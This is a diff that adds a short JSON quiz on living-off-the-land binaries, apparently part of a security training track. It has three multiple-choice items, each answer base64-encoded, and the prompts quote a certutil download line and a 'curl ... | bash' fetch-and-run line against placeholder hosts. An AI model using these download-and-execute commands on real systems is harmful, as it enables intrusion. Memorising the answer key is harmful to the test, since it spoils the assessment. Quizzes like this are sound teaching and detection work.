@@ -1,0 +1,37 @@
+{
+  "questions": [
+    {
+      "id": 1,
+      "type": "choice",
+      "prompt": "What makes a binary a LOLBin?",
+      "options": {
+        "a": "It is malware",
+        "b": "It is a legitimate, often signed system tool repurposed by an attacker (Living Off The Land)",
+        "c": "It is from the internet"
+      },
+      "answer_b64": "Yg=="
+    },
+    {
+      "id": 2,
+      "type": "choice",
+      "prompt": "certutil -urlcache -split -f http://... is abuse because:",
+      "options": {
+        "a": "certutil is banned",
+        "b": "certutil is a certificate utility used off-label to download a file",
+        "c": "It uses http"
+      },
+      "answer_b64": "Yg=="
+    },
+    {
+      "id": 3,
+      "type": "choice",
+      "prompt": "The curl http://.../u.sh | bash audited in the Bash track shows up here as:",
+      "options": {
+        "a": "A different attack",
+        "b": "The same attack in victim telemetry \u2014 auth.log / auditd execve",
+        "c": "Unrelated"
+      },
+      "answer_b64": "Yg=="
+    }
+  ]
+}
